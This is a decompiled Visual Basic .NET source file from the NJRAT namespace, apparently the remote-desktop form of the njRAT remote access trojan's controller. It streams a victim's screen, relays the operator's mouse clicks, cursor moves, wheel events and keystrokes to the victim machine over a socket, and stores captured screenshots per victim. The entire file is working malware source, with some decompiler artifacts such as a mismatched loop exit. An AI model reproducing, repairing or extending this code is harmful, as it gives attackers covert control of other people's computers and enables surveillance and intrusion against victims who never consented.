Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000024 RID: 36
	<DesignerGenerated()>
	Public Partial Class sc
		Inherits Form

		' Token: 0x060004D2 RID: 1234 RVA: 0x00170CE8 File Offset: 0x0016F0E8
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = sc.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = sc.__ENCList.Count = sc.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = sc.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = sc.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								sc.__ENCList(num) = sc.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					sc.__ENCList.RemoveRange(num, sc.__ENCList.Count - num)
					sc.__ENCList.Capacity = sc.__ENCList.Count
				End If
				sc.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170001B5 RID: 437
		' (get) Token: 0x060004D5 RID: 1237 RVA: 0x001716E8 File Offset: 0x0016FAE8
		' (set) Token: 0x060004D6 RID: 1238 RVA: 0x00171700 File Offset: 0x0016FB00
		Friend Overridable Property Panel1 As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._Panel1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._Panel1 = value
			End Set
		End Property

		' Token: 0x170001B6 RID: 438
		' (get) Token: 0x060004D7 RID: 1239 RVA: 0x0017170C File Offset: 0x0016FB0C
		' (set) Token: 0x060004D8 RID: 1240 RVA: 0x00171724 File Offset: 0x0016FB24
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				Dim flag As Boolean = Me._CheckBox1 IsNot Nothing
				If flag Then
					RemoveHandler Me._CheckBox1.CheckedChanged, value2
				End If
				Me._CheckBox1 = value
				flag = (Me._CheckBox1 IsNot Nothing)
				If flag Then
					AddHandler Me._CheckBox1.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001B7 RID: 439
		' (get) Token: 0x060004D9 RID: 1241 RVA: 0x00171784 File Offset: 0x0016FB84
		' (set) Token: 0x060004DA RID: 1242 RVA: 0x0017179C File Offset: 0x0016FB9C
		Friend Overridable Property CheckBox2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox2_CheckedChanged
				Dim flag As Boolean = Me._CheckBox2 IsNot Nothing
				If flag Then
					RemoveHandler Me._CheckBox2.CheckedChanged, value2
				End If
				Me._CheckBox2 = value
				flag = (Me._CheckBox2 IsNot Nothing)
				If flag Then
					AddHandler Me._CheckBox2.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001B8 RID: 440
		' (get) Token: 0x060004DB RID: 1243 RVA: 0x001717FC File Offset: 0x0016FBFC
		' (set) Token: 0x060004DC RID: 1244 RVA: 0x00171814 File Offset: 0x0016FC14
		Friend Overridable Property CheckBox3 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				Dim flag As Boolean = Me._CheckBox3 IsNot Nothing
				If flag Then
					RemoveHandler Me._CheckBox3.CheckedChanged, value2
				End If
				Me._CheckBox3 = value
				flag = (Me._CheckBox3 IsNot Nothing)
				If flag Then
					AddHandler Me._CheckBox3.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x170001B9 RID: 441
		' (get) Token: 0x060004DD RID: 1245 RVA: 0x00171874 File Offset: 0x0016FC74
		' (set) Token: 0x060004DE RID: 1246 RVA: 0x0017188C File Offset: 0x0016FC8C
		Friend Overridable Property ComboBox1 As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._ComboBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._ComboBox1 = value
			End Set
		End Property

		' Token: 0x170001BA RID: 442
		' (get) Token: 0x060004DF RID: 1247 RVA: 0x00171898 File Offset: 0x0016FC98
		' (set) Token: 0x060004E0 RID: 1248 RVA: 0x001718B0 File Offset: 0x0016FCB0
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001BB RID: 443
		' (get) Token: 0x060004E1 RID: 1249 RVA: 0x00171910 File Offset: 0x0016FD10
		' (set) Token: 0x060004E2 RID: 1250 RVA: 0x00171928 File Offset: 0x0016FD28
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170001BC RID: 444
		' (get) Token: 0x060004E3 RID: 1251 RVA: 0x00171934 File Offset: 0x0016FD34
		' (set) Token: 0x060004E4 RID: 1252 RVA: 0x0017194C File Offset: 0x0016FD4C
		Friend Overridable Property vmethod_16 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_16_Tick
				Dim flag As Boolean = Me._vmethod_16 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_16.Tick, value2
				End If
				Me._vmethod_16 = value
				flag = (Me._vmethod_16 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_16.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001BD RID: 445
		' (get) Token: 0x060004E5 RID: 1253 RVA: 0x001719AC File Offset: 0x0016FDAC
		' (set) Token: 0x060004E6 RID: 1254 RVA: 0x001719C4 File Offset: 0x0016FDC4
		Friend Overridable Property vmethod_12 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.vmethod_12_Tick
				Dim flag As Boolean = Me._vmethod_12 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_12.Tick, value2
				End If
				Me._vmethod_12 = value
				flag = (Me._vmethod_12 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_12.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170001BE RID: 446
		' (get) Token: 0x060004E7 RID: 1255 RVA: 0x00171A24 File Offset: 0x0016FE24
		' (set) Token: 0x060004E8 RID: 1256 RVA: 0x00171A3C File Offset: 0x0016FE3C
		Friend Overridable Property ProgressBar1 As ProgressBar
			<DebuggerNonUserCode()>
			Get
				Return Me._ProgressBar1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ProgressBar)
				Me._ProgressBar1 = value
			End Set
		End Property

		' Token: 0x170001BF RID: 447
		' (get) Token: 0x060004E9 RID: 1257 RVA: 0x00171A48 File Offset: 0x0016FE48
		' (set) Token: 0x060004EA RID: 1258 RVA: 0x00171A60 File Offset: 0x0016FE60
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As EventHandler = AddressOf Me.p_Resize
				Dim value3 As PaintEventHandler = AddressOf Me.p_Paint
				Dim value4 As MouseEventHandler = AddressOf Me.p_MouseWheel
				Dim value5 As MouseEventHandler = AddressOf Me.p_MouseUp
				Dim value6 As MouseEventHandler = AddressOf Me.p_MouseMove
				Dim value7 As EventHandler = AddressOf Me.p_MouseLeave
				Dim value8 As EventHandler = AddressOf Me.p_MouseEnter
				Dim value9 As MouseEventHandler = AddressOf Me.p_MouseDown
				Dim flag As Boolean = Me._p IsNot Nothing
				If flag Then
					RemoveHandler Me._p.Resize, value2
					RemoveHandler Me._p.Paint, value3
					RemoveHandler Me._p.MouseWheel, value4
					RemoveHandler Me._p.MouseUp, value5
					RemoveHandler Me._p.MouseMove, value6
					RemoveHandler Me._p.MouseLeave, value7
					RemoveHandler Me._p.MouseEnter, value8
					RemoveHandler Me._p.MouseDown, value9
				End If
				Me._p = value
				flag = (Me._p IsNot Nothing)
				If flag Then
					AddHandler Me._p.Resize, value2
					AddHandler Me._p.Paint, value3
					AddHandler Me._p.MouseWheel, value4
					AddHandler Me._p.MouseUp, value5
					AddHandler Me._p.MouseMove, value6
					AddHandler Me._p.MouseLeave, value7
					AddHandler Me._p.MouseEnter, value8
					AddHandler Me._p.MouseDown, value9
				End If
			End Set
		End Property

		' Token: 0x170001C0 RID: 448
		' (get) Token: 0x060004EB RID: 1259 RVA: 0x00171BE8 File Offset: 0x0016FFE8
		' (set) Token: 0x060004EC RID: 1260 RVA: 0x00171C00 File Offset: 0x00170000
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				Dim flag As Boolean = Me._Button2 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				flag = (Me._Button2 IsNot Nothing)
				If flag Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060004ED RID: 1261 RVA: 0x00171C60 File Offset: 0x00170060
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.sc_FormClosing
			AddHandler MyBase.Load, AddressOf Me.sc_Load
			AddHandler MyBase.ResizeBegin, AddressOf Me.sc_ResizeBegin
			AddHandler MyBase.ResizeEnd, AddressOf Me.sc_ResizeEnd
			sc.__ENCAddToList(Me)
			Me.QQ = String.Empty
			Me.Oimg = Nothing
			Me.point_0 = Nothing
			Me.point_1 = Nothing
			Me.co = 0
			Me.Folder = String.Empty
			Me.point_2 = New Point(30, 30)
			Me.IsActive = False
			Me.fps = 0
			Me.int_0 = 0
			Me.dbf = 0L
			Me.InitializeComponent()
		End Sub

		' Token: 0x060004EE RID: 1262 RVA: 0x00171D40 File Offset: 0x00170140
		Public Sub KDW(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If Not flag Then
				Me.p.Focus()
				flag = Me.CheckBox2.Checked
				If flag Then
					Dim keyCode As Keys = e.KeyCode
					Dim flag2 As Boolean
					If keyCode <> Keys.Shift AndAlso keyCode <> Keys.ShiftKey Then
						If keyCode <> Keys.LShiftKey Then
							If keyCode <> Keys.RShiftKey Then
								flag2 = False
								GoTo IL_71
							End If
						End If
					End If
					flag2 = True
					IL_71:
					Dim flag3 As Boolean = flag2
					If flag3 Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(16) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(0), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x060004EF RID: 1263 RVA: 0x00171E68 File Offset: 0x00170268
		Public Sub KUP(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Start", False) = 0
			If Not flag Then
				Me.p.Focus()
				flag = Me.CheckBox2.Checked
				If flag Then
					Dim keyCode As Keys = e.KeyCode
					Dim flag2 As Boolean
					If keyCode <> Keys.Shift AndAlso keyCode <> Keys.ShiftKey Then
						If keyCode <> Keys.LShiftKey Then
							If keyCode <> Keys.RShiftKey Then
								flag2 = False
								GoTo IL_71
							End If
						End If
					End If
					flag2 = True
					IL_71:
					Dim flag3 As Boolean = flag2
					If flag3 Then
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(16) }))
					Else
						Me.sk.Send(String.Concat(New String() { "#", Class7.string_1, Conversions.ToString(2), Class7.string_1, Conversions.ToString(CInt(e.KeyCode)) }))
					End If
				End If
				e.SuppressKeyPress = True
			End If
		End Sub

		' Token: 0x060004F0 RID: 1264 RVA: 0x00171F90 File Offset: 0x00170390
		Private Sub p_MouseDown(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
				If flag Then
					Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
					flag = (e.Button = MouseButtons.Left)
					Dim value As Integer
					If flag Then
						value = 2
					End If
					flag = (e.Button = MouseButtons.Right)
					If flag Then
						value = 8
					End If
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x060004F1 RID: 1265 RVA: 0x0017210C File Offset: 0x0017050C
		Private Sub p_MouseEnter(sender As Object, e As EventArgs)
			Me.IsActive = True
		End Sub

		' Token: 0x060004F2 RID: 1266 RVA: 0x00172118 File Offset: 0x00170518
		Private Sub p_MouseLeave(sender As Object, e As EventArgs)
			Me.IsActive = False
		End Sub

		' Token: 0x060004F3 RID: 1267 RVA: 0x00172124 File Offset: 0x00170524
		Private Sub p_MouseMove(sender As Object, e As MouseEventArgs)
			Me.point_2 = e.Location
			Dim flag As Boolean = Me.point_2.Y < 20
			If flag Then
				Me.Button2.Visible = True
			Else
				Me.Button2.Visible = False
			End If
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				flag = ((Not Me.p.Focused And Me.CheckBox2.Checked) Or Me.CheckBox1.Checked)
				If flag Then
					Me.p.Focus()
				End If
			End SyncLock
		End Sub

		' Token: 0x060004F4 RID: 1268 RVA: 0x001721D4 File Offset: 0x001705D4
		Private Sub p_MouseUp(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
			If flag Then
				Dim point As Point = New Point(CInt(Math.Round(Math.Round(CDbl(e.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(e.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				flag = (e.Button = MouseButtons.Left)
				Dim value As Integer
				If flag Then
					value = 4
				End If
				flag = (e.Button = MouseButtons.Right)
				If flag Then
					value = 16
				End If
				Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(point.X), Class7.string_1, Conversions.ToString(point.Y), Class7.string_1, Conversions.ToString(value) }))
			End If
		End Sub

		' Token: 0x060004F5 RID: 1269 RVA: 0x00172308 File Offset: 0x00170708
		Private Sub p_MouseWheel(sender As Object, e As MouseEventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
				Dim flag As Boolean = Me.CheckBox1.Checked AndAlso Operators.CompareString(Me.Button1.Text, "Start", False) <> 0
				If flag Then
					Me.sk.Send(String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(e.Delta), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(2048) }))
				End If
			End SyncLock
		End Sub

		' Token: 0x060004F6 RID: 1270 RVA: 0x001723E4 File Offset: 0x001707E4
		Private Sub p_Paint(sender As Object, e As PaintEventArgs)
			Dim text As String = Conversions.ToString(Me.int_0) + "fps" & vbCrLf + Class6.smethod_17(Me.pkt)
			Dim size As Size = TextRenderer.MeasureText(text, New Font(Me.Font, FontStyle.Bold))
			Dim flag As Boolean = Not(Me.point_2.X < size.Width And Me.point_2.Y < size.Height)
			If flag Then
				Dim rect As Rectangle = New Rectangle(0, 0, size.Width, size.Height)
				e.Graphics.FillRectangle(New Pen(Color.FromArgb(100, 1, 1, 1)).Brush, rect)
				Dim brush As Brush = Brushes.Red
				flag = (Me.int_0 > 3)
				If flag Then
					brush = Brushes.YellowGreen
				End If
				flag = (Me.int_0 > 6)
				If flag Then
					brush = Brushes.LimeGreen
				End If
				e.Graphics.DrawString(text, New Font(Me.Font, FontStyle.Bold), brush, 0F, 0F)
			End If
		End Sub

		' Token: 0x060004F7 RID: 1271 RVA: 0x001724EC File Offset: 0x001708EC
		Private Sub p_Resize(sender As Object, e As EventArgs)
			Me.Button2.Left = CInt(Math.Round(Math.Round(CDbl(Me.p.Width) / 2.0 - CDbl(Me.Button2.Width) / 2.0)))
			Me.Button2.Top = Me.p.Top + 3
		End Sub

		' Token: 0x060004F8 RID: 1272 RVA: 0x0017255C File Offset: 0x0017095C
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Button1.Text, "Stop", False) = 0
			If flag Then
				Me.Button1.Text = "Start"
				Me.sk.Send("!!")
				Me.ComboBox1.Enabled = True
			Else
				Me.ComboBox1.Enabled = False
				Me.Button1.Text = "Stop"
				Dim num As Single = CSng((Conversions.ToDouble(Me.ComboBox1.Text.Remove(0, 1)) / 100.0))
				Dim size As Size = New Size(CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Width) * num / 10F))))) * 10, CInt(Math.Round(Math.Round(CDbl((CSng(Me.sz.Height) * num / 10F))))) * 10)
				Me.sk.Send(String.Concat(New String() { "!", Class7.string_1, Me.sk.ip(), Class7.string_1, Conversions.ToString(size.Width), "x", Conversions.ToString(size.Height), Class7.string_1, "0" }))
			End If
		End Sub

		' Token: 0x060004F9 RID: 1273 RVA: 0x001726CC File Offset: 0x00170ACC
		Private Sub vmethod_16_Tick(sender As Object, e As EventArgs)
			Me.vmethod_12.Enabled = False
			Dim flag As Boolean = Not Me.osk.CN Or Not Me.sk.CN
			If flag Then
				Me.sk.CN = False
				Me.Panel1.Enabled = False
				Me.Text = "Disconnected!! " + Me.QQ
				Me.Close()
			Else
				Me.int_0 = Me.fps
				Me.fps = 0
				flag = (Me.int_0 = 0)
				If flag Then
					Me.pkt = 0L
					Me.p.Invalidate()
				End If
				Me.vmethod_12.Enabled = True
			End If
		End Sub

		' Token: 0x060004FA RID: 1274 RVA: 0x00172788 File Offset: 0x00170B88
		Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060004FB RID: 1275 RVA: 0x0017278C File Offset: 0x00170B8C
		Private Sub vmethod_12_Tick(sender As Object, e As EventArgs)
			Me.ProgressBar1.Value = Me.sk.rp()
			Dim point As Point = Me.PointToClient(Cursor.Position)
			Dim flag As Boolean = point.X > -1 And point.Y > -1 And Me.IsActive
			If flag Then
				Me.point_0 = New Point(CInt(Math.Round(Math.Round(CDbl(point.X) * (CDbl(Me.sz.Width) / CDbl(Me.p.Width))))), CInt(Math.Round(Math.Round(CDbl(point.Y) * (CDbl(Me.sz.Height) / CDbl(Me.p.Height))))))
				flag = ((Me.CheckBox1.Checked And Operators.CompareString(Me.Button1.Text, "Start", False) <> 0) AndAlso Me.point_0 <> Me.point_1)
				If flag Then
					Me.point_1 = Me.point_0
					Dim client As Client = Me.sk
					Dim text As String = String.Concat(New String() { "@", Class7.string_1, Conversions.ToString(Me.point_1.X), Class7.string_1, Conversions.ToString(Me.point_1.Y), Class7.string_1, Conversions.ToString(1) })
					client.SEND_(Class6.smethod_11(text))
				End If
			End If
		End Sub

		' Token: 0x060004FC RID: 1276 RVA: 0x00172918 File Offset: 0x00170D18
		Private Sub sc_FormClosing(sender As Object, e As FormClosingEventArgs)
			Dim flag As Boolean = Me.sk IsNot Nothing
			If flag Then
				Me.sk.CN = False
			End If
		End Sub

		' Token: 0x060004FD RID: 1277 RVA: 0x00172944 File Offset: 0x00170D44
		Private Sub sc_Load(sender As Object, e As EventArgs)
			Try
				Dim p As PictureBox = Me.p
				Dim obj As PictureBox = p
				SyncLock obj
					Me.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
					Me.Text = Me.QQ
					Dim p2 As Control = Me.p
					AddHandler p2.KeyUp, AddressOf Me.KUP
					AddHandler p2.KeyDown, AddressOf Me.KDW
					Me.ComboBox1.SelectedIndex = Conversions.ToInteger(Class7.class8_0.string_0)
				End SyncLock
				Me.Folder = Me.osk.Folder + "Screen\"
				Dim flag As Boolean = Not Directory.Exists(Me.Folder)
				If flag Then
					Directory.CreateDirectory(Me.Folder)
				End If
				flag = Class7.class8_0.bool_6
				If flag Then
					Me.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
				flag = (Operators.CompareString(Me.Button1.Text, "Start", False) <> 0)
				If flag Then
					Me.Button2_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
				End If
			Catch ex As Exception
				Me.Close()
			End Try
		End Sub

		' Token: 0x060004FE RID: 1278 RVA: 0x00172AD8 File Offset: 0x00170ED8
		Private Sub sc_ResizeBegin(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x060004FF RID: 1279 RVA: 0x00172B14 File Offset: 0x00170F14
		Private Sub sc_ResizeEnd(sender As Object, e As EventArgs)
			Dim p As PictureBox = Me.p
			Dim obj As PictureBox = p
			SyncLock obj
			End SyncLock
		End Sub

		' Token: 0x06000500 RID: 1280 RVA: 0x00172B50 File Offset: 0x00170F50
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.Panel1.Visible
			If flag Then
				Me.Panel1.Visible = True
				Me.Button2.BackgroundImage = Resources.bullet_arrow_up
			Else
				Me.Panel1.Visible = False
				Me.Button2.BackgroundImage = Resources.bullet_arrow_down
			End If
		End Sub

		' Token: 0x06000501 RID: 1281 RVA: 0x00172BB4 File Offset: 0x00170FB4
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			Dim checked As Boolean = Me.CheckBox3.Checked
			If checked Then
				Try
					Process.Start(Me.Folder)
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000502 RID: 1282 RVA: 0x00172C04 File Offset: 0x00171004
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000239 RID: 569
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400023B RID: 571
		<AccessedThroughProperty("Panel1")>
		Private _Panel1 As Panel

		' Token: 0x0400023C RID: 572
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x0400023D RID: 573
		<AccessedThroughProperty("CheckBox2")>
		Private _CheckBox2 As CheckBox

		' Token: 0x0400023E RID: 574
		<AccessedThroughProperty("CheckBox3")>
		Private _CheckBox3 As CheckBox

		' Token: 0x0400023F RID: 575
		<AccessedThroughProperty("ComboBox1")>
		Private _ComboBox1 As ComboBox

		' Token: 0x04000240 RID: 576
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000241 RID: 577
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000242 RID: 578
		<AccessedThroughProperty("vmethod_16")>
		Private _vmethod_16 As Timer

		' Token: 0x04000243 RID: 579
		<AccessedThroughProperty("vmethod_12")>
		Private _vmethod_12 As Timer

		' Token: 0x04000244 RID: 580
		<AccessedThroughProperty("ProgressBar1")>
		Private _ProgressBar1 As ProgressBar

		' Token: 0x04000245 RID: 581
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x04000246 RID: 582
		<AccessedThroughProperty("Button2")>
		Private _Button2 As Button

		' Token: 0x04000247 RID: 583
		Public co As Integer

		' Token: 0x04000248 RID: 584
		Public dbf As Long

		' Token: 0x04000249 RID: 585
		Public Folder As String

		' Token: 0x0400024A RID: 586
		Public fps As Integer

		' Token: 0x0400024B RID: 587
		Private int_0 As Integer

		' Token: 0x0400024C RID: 588
		Public IsActive As Boolean

		' Token: 0x0400024D RID: 589
		Public Oimg As Bitmap

		' Token: 0x0400024E RID: 590
		Public osk As Client

		' Token: 0x0400024F RID: 591
		Public pkt As Long

		' Token: 0x04000250 RID: 592
		Private point_0 As Point

		' Token: 0x04000251 RID: 593
		Private point_1 As Point

		' Token: 0x04000252 RID: 594
		Private point_2 As Point

		' Token: 0x04000253 RID: 595
		Public QQ As String

		' Token: 0x04000254 RID: 596
		Public sk As Client

		' Token: 0x04000255 RID: 597
		Public sz As Size
	End Class
End Namespace
